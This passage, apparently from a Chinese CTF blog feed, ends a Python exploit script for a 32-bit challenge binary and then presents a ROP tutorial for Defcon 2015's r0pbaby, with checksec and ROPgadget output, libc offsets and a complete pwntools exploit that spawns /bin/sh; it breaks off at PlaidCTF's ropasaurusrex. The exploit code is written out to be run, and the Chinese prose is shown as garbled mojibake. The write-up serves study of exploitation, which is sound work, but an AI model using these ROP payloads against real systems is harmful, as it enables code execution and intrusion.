class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">skip</span>(<span class="params">socket, x</span>):</span></span><br><span class="line">    print(read_until(target, x).decode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    print(<span class="string">&quot;=======&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    <span class="keyword">import</span> struct</span><br><span class="line">    <span class="keyword">import</span> socket</span><br><span class="line">    <span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;host&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;port&quot;</span>, type=int)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    target = socket.socket()</span><br><span class="line">    target.connect((args.host, args.port))</span><br><span class="line"></span><br><span class="line">    input(<span class="string">&quot;Are you ready? This is the time to attach gdb and stuff.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    skip(target, <span class="string">b&quot;Quit&quot;</span>)</span><br><span class="line"></span><br><span class="line">    target.send(<span class="string">b&quot;4\n&quot;</span>)</span><br><span class="line">    skip(target, <span class="string">b&quot;execution&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># We partially overwrite the return address, we need to comeup</span></span><br><span class="line">    <span class="comment"># with valid-in-the-future values for ebx and ebp.</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * <span class="number">14</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x3e1b7a6c</span>)    <span class="comment"># ebx / computed</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x3e1b8000</span>)    <span class="comment"># ebp # must only be valid r/w</span></span><br><span class="line">    payload += <span class="string">b&quot;\x14&quot;</span> <span class="comment"># re-trigger init with known/constant random_seed, provided by esi.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make sure we don&#x27;t send too much at once.</span></span><br><span class="line"></span><br><span class="line">    target.send(payload)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    todo = <span class="number">100</span> - len(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> todo &gt; <span class="number">0</span>:</span><br><span class="line">        sending = min(<span class="number">10</span>, todo)</span><br><span class="line">        target.send(<span class="string">b&quot;a&quot;</span> * (sending - <span class="number">1</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        todo = todo - sending</span><br><span class="line">        print(<span class="string">&quot;.&quot;</span>, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Sent first stage, waiting for menu.&quot;</span>)</span><br><span class="line">    skip(target, <span class="string">b&quot;Quit&quot;</span>)</span><br><span class="line"></span><br><span class="line">    target.send(<span class="string">b&quot;4\n&quot;</span>)</span><br><span class="line">    skip(target, <span class="string">b&quot;execution&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Sending exploit.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_addr</span>(<span class="params">addr, name</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Get runtime addr from ida addr.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        ida_base = <span class="number">0x8048000</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># It seems under xinetd there is one more call to prng().</span></span><br><span class="line">        <span class="comment"># Not sure why this is but we just have to check what</span></span><br><span class="line">        <span class="comment"># value will be generated and use that.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># run_base = 0x39d54000 # local no xinetd</span></span><br><span class="line">        run_base = <span class="number">0xfe97c000</span> <span class="comment"># local with xinetd</span></span><br><span class="line"></span><br><span class="line">        ret = addr + (run_base - ida_base)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;%s will be at %#.8x&quot;</span> % (name, ret))</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pack_addr</span>(<span class="params">addr, name</span>):</span></span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>, get_addr(addr, name))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * <span class="number">14</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x42424242</span>)    <span class="comment"># base</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x42424242</span>)    <span class="comment"># ebp</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># This is so we can ironically expect a F.U.C.K.U.P.</span></span><br><span class="line">    payload += pack_addr(<span class="number">0x080483C0</span>, <span class="string">&quot;welcome&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Setup syscall. ebx, ecx, edx. eax=11</span></span><br><span class="line"></span><br><span class="line">    payload += pack_addr(<span class="number">0x0804908f</span>, <span class="string">&quot;pop eax; pop ebx; pop esi; ret&quot;</span>)</span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">11</span>)            <span class="comment"># execv</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x22222222</span>)</span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x22222222</span>)</span><br><span class="line"></span><br><span class="line">    payload += pack_addr(<span class="number">0x0804961a</span>, <span class="string">&quot;pop edx; pop ecx; pop ebx; ret&quot;</span>)</span><br><span class="line">    payload += pack_addr(<span class="number">0x080485f9</span>, <span class="string">&quot;NULL&quot;</span>)    <span class="comment"># environ</span></span><br><span class="line">    payload += pack_addr(<span class="number">0x080485f9</span>, <span class="string">&quot;NULL&quot;</span>)    <span class="comment"># argv</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x22222222</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Now we use this neat gadget, /bin/sh is right after us.</span></span><br><span class="line">    payload += pack_addr(<span class="number">0x0804875b</span>, <span class="string">&quot;lea ebx, [esp+4]; int 0x80&quot;</span>)</span><br><span class="line">    payload += pack_addr(<span class="number">0x08048a11</span>, <span class="string">&quot;pop; pop; ret&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x44444444</span>)    <span class="comment"># eip, too lazy for clean exit.</span></span><br><span class="line"></span><br><span class="line">    payload = payload.ljust(<span class="number">100</span>, <span class="string">b&quot;\xcc&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ok, sanity check and good to go.</span></span><br><span class="line">    <span class="keyword">assert</span> len(payload) &lt;= <span class="number">100</span>, <span class="string">&quot;payload too large, %d bytes.&quot;</span> % len(payload)</span><br><span class="line"></span><br><span class="line">    target.send(payload)</span><br><span class="line">    skip(target, <span class="string">b&quot;F.U.C.K.U.P.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    target.set_inheritable(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;You should be able to type stuff now.&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;socat STDIO FD:%d&quot;</span> % target.fileno())</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºç¡€æ ˆæº¢å‡ºå¤ä¹  äºŒ ä¹‹ ROP</title>
      <link href="stack-overflow-two-ROP.html"/>
      <url>stack-overflow-two-ROP.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="ç°ä»£æ ˆæº¢å‡ºåˆ©ç”¨æŠ€æœ¯åŸºç¡€ï¼šROP"><a href="#ç°ä»£æ ˆæº¢å‡ºåˆ©ç”¨æŠ€æœ¯åŸºç¡€ï¼šROP" class="headerlink" title="ç°ä»£æ ˆæº¢å‡ºåˆ©ç”¨æŠ€æœ¯åŸºç¡€ï¼šROP"></a>ç°ä»£æ ˆæº¢å‡ºåˆ©ç”¨æŠ€æœ¯åŸºç¡€ï¼šROP</h4><p>æ‰¿æ¥ä¸Šä¸€ä¸ªç¯‡ç›®ï¼Œè¿™é‡Œç»§ç»­è®²ROPçš„ä¸€äº›é¢˜ç›®åˆ†æã€‚è®²çœŸçš„ï¼Œæˆ‘è¿™é‡ŒåŸºæœ¬ä¸Šçš„é¢˜ç›®ä»¥åŠæ”»å‡»æ–¹å¼éƒ½æ¥è‡ªäº<em>Atum</em>å¸ˆå‚…åœ¨X-MANçš„PPTã€‚</p><h5 id="CTFä¸­ROPçš„å¸¸è§„å¥—è·¯"><a href="#CTFä¸­ROPçš„å¸¸è§„å¥—è·¯" class="headerlink" title="CTFä¸­ROPçš„å¸¸è§„å¥—è·¯:"></a>CTFä¸­ROPçš„å¸¸è§„å¥—è·¯:</h5><ul><li>ç¬¬ä¸€æ¬¡è§¦å‘æ¼æ´ï¼Œé€šè¿‡ROPæ³„æ¼libcçš„address(å¦‚puts_got)ï¼Œè®¡ç®—systemåœ°å€ï¼Œç„¶åè¿”å›åˆ°ä¸€ä¸ªå¯ä»¥é‡ç°è§¦å‘æ¼æ´çš„ä½ç½®(å¦‚main)ï¼Œå†æ¬¡è§¦å‘æ¼æ´ï¼Œé€šè¿‡ROPè°ƒç”¨system(â€œ/bin/shâ€)</li><li>ç›´æ¥execve(â€œ/bin/shâ€, [â€œ/bin/shâ€], NULL)ï¼Œé€šå¸¸åœ¨é™æ€é“¾æ¥æ—¶æ¯”è¾ƒå¸¸ç”¨<br>ä¸‰ä¸ªç»ƒä¹ :</li><li>Defcon 2015 Qualifierï¼šR0pbaby</li><li>AliCTF 2016ï¼švss</li><li>PlaidCTF 2013: ropasaurusrex<br>ç›¸å…³é¢˜ç›®æˆ‘ä»¬å¯ä»¥åœ¨<a href="https://github.com/ctfs/">CTFs</a>ä¸Šæ‰¾åˆ°ã€‚<h5 id="Defcon-2015-Qualifierï¼šR0pbaby"><a href="#Defcon-2015-Qualifierï¼šR0pbaby" class="headerlink" title="Defcon 2015 Qualifierï¼šR0pbaby"></a>Defcon 2015 Qualifierï¼šR0pbaby</h5></li></ul><p>æˆ‘ä»¬æ‹¿åˆ°é¢˜ç›®ï¼Œå¯ä»¥å…ˆå¯¹é¢˜ç›®è¿›è¡Œæ£€æŸ¥ï¼Œå¯å…ˆçœ‹çœ‹é¢˜ç›®å¼€å¯çš„ä¿æŠ¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : ENABLED</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure><p>gdb-peda è‡ªå¸¦çš„ checksec æœ‰æ£€æµ‹ç¨‹åºæ˜¯å¦å¼€å¯ä¿æŠ¤ï¼Œä»¥åŠæ‰€å¼€å¯çš„ä¿æŠ¤ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<em>R0pbaby</em> æ‰€å¼€å¯çš„ä¿æŠ¤æœ‰FORTIFYä»¥åŠNXï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦æ‰€æ”¶åˆ°çš„é™åˆ¶æ˜¯æ ˆä¸Šå†™å…¥çš„æ•°æ®ä¸å¯æ‰§è¡Œã€‚<br>ä»¥åŠï¼Œç¨‹åºå¯ä»¥çŸ¥é“æ˜¯ï¼–ï¼”ä½çš„ï¼Œå®ƒçš„ä¼ å‚ä¼˜å…ˆç”±å¯„å­˜å™¨å®Œæˆã€‚<br>æ¥ç€ï¼Œæˆ‘ä»¬åº”è¯¥äº†è§£ç¨‹åºçš„æµç¨‹ï¼Œä»¥åŠæ‰¾åˆ°ç¨‹åºçš„æ¼æ´ï¼Œä»¥åŠæ€è€ƒå…¶åˆ©ç”¨æ–¹å¼ã€‚</p><p>*å°è¯•è¿è¡Œç¨‹åº</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-01.png"></a></p><p>æˆ‘ä»¬å»å°è¯•è¿è¡Œï¼Œæ‘¸æ¸…äº†åŸºæœ¬ä¸Šçš„ç¨‹åºçš„åŠŸèƒ½ã€‚</p><ol><li>åŠŸèƒ½1ï¼Œå¯ä»¥è·å¾—libcçš„åŸºå€</li><li>åŠŸèƒ½2ï¼Œå¯ä»¥è·å¾—å‡½æ•°çš„åœ°å€</li><li>åŠŸèƒ½3ï¼Œè¾“å…¥çš„åœ°æ–¹ï¼Œæ„Ÿè§‰è¿™ä¸ªåœ°æ–¹å¯èƒ½å­˜åœ¨æ¼æ´ã€‚</li></ol><p>ç´§æ¥ç€ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨IDA åˆ†æç¨‹åºäº†ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-02.png"></a></p><p>å‘ç°ä¸€ä¸ªå‡½æ•°çš„ä¸é€‚å½“åº”ç”¨ï¼Œæ‹·è´çš„è¿‡ç¨‹ä¸­æ²¡æœ‰åˆ¤æ–­å¤§å°ï¼Œå¯èƒ½é€ æˆç¼“å†²åŒºæº¢å‡ºã€‚</p><hr><p>å‡½æ•°åŸå‹<br>void  * memcpy(void*dest, const void * src, size_t n);<br>ç”±srcæŒ‡å‘åœ°å€ä¸ºèµ·å§‹åœ°å€çš„è¿ç»­nä¸ªå­—èŠ‚çš„æ•°æ®å¤åˆ¶åˆ°ä»¥destinæŒ‡å‘åœ°å€ä¸ºèµ·å§‹åœ°å€çš„ç©ºé—´å†…ã€‚</p><hr><p>savedregsæ˜¯ä¸€ä¸ªIDAå…³é”®å­—ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° ä¿å­˜çš„å †æ ˆå¸§æŒ‡é’ˆå’Œå‡½æ•°è¿”å›åœ°å€ï¼šåœ¨IDAä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å•å‡»å®ƒã€‚<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-03.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-04.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-04.png"></a></p><p>bufçš„å¤§å°åº”è¯¥æ˜¯8æ²¡é”™ï¼Œä¹‹åå¯èƒ½é€ æˆç¼“å†²åŒºæº¢å‡ºï¼Œé‚£ä¹ˆæˆ‘çš„è§£é¢˜æ€è·¯å¤§æ¦‚æ˜¯å¦‚ä¸‹ï¼š</p><ol><li>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªgadget RDI ç”¨æ¥èµ·shell</li><li>å…¶æ¬¡æˆ‘ä»¬éœ€è¦æ‰¾åˆ° â€œbin/shâ€çš„åœ°å€</li><li>æœ€åï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°systemå‡½æ•°çš„åœ°å€</li></ol><p>å®Œæˆä¸Šé¢ä¸‰ä¸ªæ­¥éª¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥å»æ„é€ æˆ‘ä»¬çš„ROPé“¾æ¥getshellã€‚</p><h5 id="å¦‚ä½•æ‰¾åˆ°-pop-rdi"><a href="#å¦‚ä½•æ‰¾åˆ°-pop-rdi" class="headerlink" title="å¦‚ä½•æ‰¾åˆ° pop rdi"></a>å¦‚ä½•æ‰¾åˆ° <code>pop rdi</code></h5><p>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤çš„æŒ‡ä»¤ï¼Œ<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•çš„objdumpæ¥å¯»æ‰¾ç®€å•çš„gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~&#x2F;æ¡Œé¢&#x2F;Rop$ python ROPgadget.py --binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">0x00000000000206c1 : pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000000b5a23 : pop rbp ; pop r12 ; pop r14 ; ret</span><br><span class="line">0x000000000001fb11 : pop rbp ; pop r12 ; ret</span><br><span class="line">0x000000000012bf16 : pop rbp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x0000000000020252 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="line">0x00000000000210fe : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000ccb05 : pop rbp ; pop r14 ; pop rbp ; ret</span><br><span class="line">0x00000000000202e6 : pop rbp ; pop r14 ; ret</span><br><span class="line">0x000000000006d128 : pop rbp ; pop rbp ; ret</span><br><span class="line">0x0000000000048438 : pop rbp ; pop rbx ; ret</span><br><span class="line">0x000000000001f930 : pop rbp ; ret</span><br><span class="line">0x00000000000ccb01 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret</span><br><span class="line">0x000000000006d124 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span><br><span class="line">0x00000000000398c5 : pop rbx ; pop r12 ; pop rbp ; ret</span><br><span class="line">0x00000000000202e1 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000000206c0 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000000b5a22 : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret</span><br><span class="line">0x000000000001fb10 : pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x000000000012bf15 : pop rbx ; pop rbp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x000000000001f92f : pop rbx ; pop rbp ; ret</span><br><span class="line">0x000000000002a69a : pop rbx ; ret</span><br><span class="line">0x0000000000001b18 : pop rbx ; ret 0x2a63</span><br><span class="line">0x0000000000185240 : pop rbx ; ret 0x6f9</span><br><span class="line">0x000000000013c01f : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x000000000010134b : pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x00000000000e9aba : pop rcx ; pop rbx ; ret</span><br><span class="line">0x0000000000001b17 : pop rcx ; pop rbx ; ret 0x2a63</span><br><span class="line">0x00000000000fc3e2 : pop rcx ; ret</span><br><span class="line">0x0000000000020256 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000021102 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯æœ¬åœ°æµ‹è¯•ï¼Œæ‰€ä»¥æˆ‘å…ˆæŸ¥çœ‹è‡ªå·±æœ¬åœ°çš„libc.so.6<br>ç¡®è®¤libc.so.6</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~/æ¡Œé¢/Rop$ ldd r0pbaby</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffd000)</span><br><span class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7bd9000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7810000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x0000555555554000)</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~/æ¡Œé¢/Rop$ strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"> 18c177 /bin/sh</span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“ åç§»æ˜¯0x18c177</p><p>è‡³äºsytemå‡½æ•°ï¼Œç¨‹åºçš„ç¬¬äºŒä¸ªåŠŸèƒ½å·²ç»ç»™æˆ‘ä»¬äº†ï¼Œè‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹æ„é€ æˆ‘ä»¬çš„expäº†.</p><p>system = 0x00007FFFF784F390  #get_libc_base()<br>rdi_gadget_offset = 0x21102<br>bin_sh_offset = 0x18c177<br>system_offset = 0x45390</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug =<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug ==<span class="number">1</span>:</span><br><span class="line">  io = process(<span class="string">&quot;./r0pbaby&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">  <span class="comment">#db.attach(io)</span></span><br><span class="line"></span><br><span class="line">system = <span class="number">0x00007FFFF784F390</span><span class="comment">#get_libc_base()</span></span><br><span class="line">rdi_gadget_offset = <span class="number">0x21102</span></span><br><span class="line">bin_sh_offset = <span class="number">0x18c177</span></span><br><span class="line">system_offset = <span class="number">0x45390</span></span><br><span class="line">libc_base = system - system_offset <span class="comment"># system addr - system_offset = libc_base</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] libc base: [%x]&quot;</span> % libc_base</span><br><span class="line">rdi_gadget_addr = libc_base + rdi_gadget_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] RDI gadget addr: [%x]&quot;</span> % rdi_gadget_addr</span><br><span class="line">bin_sh_addr = libc_base + bin_sh_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] \&quot;/bin/sh\&quot; addr: [%x]&quot;</span> % bin_sh_addr</span><br><span class="line">system_addr = <span class="number">0x00007FFFF784F390</span><span class="comment">#get_libc_func_addr(h, &quot;system&quot;)</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] system addr: [%x]&quot;</span> % system_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(rdi_gadget_addr)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.send(<span class="string">&quot;%d\n&quot;</span>%(len(payload)+<span class="number">1</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-05.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-05.png"></a></p><p>è‡³æ­¤ ä¸€ä¸ªç®€å•çš„64ä½ç¨‹åº ROP Pwné¢˜å®Œæˆï¼ï¼æ’’èŠ±ã€€æ’’èŠ±ï½</p><h5 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013: ropasaurusrex"></a>PlaidCTF 2013: ropasaurusrex</h5><p>ä¸Šä¸€ä¸ªç¨‹åºç®€å•çš„è°ƒç”¨ system + â€œbin/shâ€ é€šè¿‡å¯„å­˜å™¨ gadget  â€œpop rdi;ret â€œä¼ å‚èµ·shellï¼Œæ¥ç€æˆ‘ä»¬æ¥å®Œæˆç¬¬äºŒä¸ªpwnï¼Œç¬¬äºŒä¸ªpwnçš„ç‰¹ç‚¹æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦å»info leak å¾—åˆ°ä¿¡æ¯ï¼Œç„¶åè®¡ç®—system çš„åœ°å€ã€‚</p><p>ä¾æ—§æ˜¯è€ä¸‰å¥—ï¼Œæˆ‘ä»¬å…ˆåˆ†æä¸€ä¸‹ç¨‹åºå¼€å¯çš„ä¿æŠ¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure><p>åªå¼€äº†NX å…¶ä»–çš„éƒ½æ²¡å¼€ï¼Œæˆ‘ä»¬å¯ä»¥åº”ç”¨ret2libc çš„æ”»å‡»æ–¹å¼æ¥è·å–shellï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—é€šè¿‡æ¯”å¦‚åƒwriteã€putsã€printfç±»ä¼¼çš„å‡½æ•°åšinfo leakç”¨æ¥è®¡ç®—systemåœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚æˆ‘ä»¬ç”¨IDAå¼€ï¼Œä¸€è¾¹åˆ†æé¢˜ç›®æµç¨‹ï¼Œä¸€è¾¹æ‰¾é¢˜ç›®æ¼æ´ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_80483F4();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;WIN\n&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sub_80483F4</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 